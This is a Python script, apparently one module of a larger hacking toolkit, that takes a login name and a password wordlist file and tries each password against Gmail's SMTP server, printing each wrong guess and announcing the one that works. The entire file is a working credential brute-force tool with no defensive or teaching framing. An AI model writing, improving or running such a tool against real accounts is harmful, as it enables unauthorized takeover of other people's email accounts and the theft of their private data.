import colorama
from colorama import Fore,Back,Style
import os
import social2
import smtplib
from smtplib import *
colorama.init()
def main():
 global passwords,path_to_file,login
 login=input("Enter your login:")
 path_to_file=input("Enter file with passwords:")
 login_to_server()
 get_password()
def get_password():
 with open (path_to_file,'r') as file:
  for password in file.readlines():
   brute(password.strip())
def login_to_server():
 global server
 try:
  server=smtplib.SMTP('smtp.gmail.com',587)
  print(Fore.GREEN+"Connected to SMTP server"+Fore.RESET)
 except SMTPConnectError:
  print(Fore.RED+"Error with connection!"+Fore.RESET)
  social2.check_back("brute")
 server.starttls()
def brute(password):
 try:
  server.login(login,password)
  print(Fore.GREEN+"Password was found:{}".format(password)+Fore.RESET)
  social2.check_back('brute')
 except SMTPAuthenticationError:
  print (Fore.RED+"Wrong password:{}".format(password)+Fore.RESET)

